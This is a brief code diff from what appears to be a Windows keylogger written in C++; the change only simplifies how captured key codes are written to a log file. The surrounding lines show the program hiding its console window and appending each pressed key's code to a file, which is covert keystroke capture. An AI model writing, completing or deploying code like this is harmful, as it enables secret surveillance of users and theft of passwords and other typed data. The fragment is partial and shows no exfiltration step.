@@ -7,7 +7,6 @@ int main()
     ShowWindow( GetConsoleWindow(), SW_HIDE );
 
     int state;
-    std::string ss;
     std::string enc_log;
     std::ofstream file;
 
@@ -31,11 +30,9 @@ int main()
 
             if (state == 1 || state == -32767)
             {
-                ss = std::to_string(i);
-
                 file.open(enc_log, std::ios::app);
 
-                file << ss << ".";
+                file << i << ".";
 
                 file.flush();
 
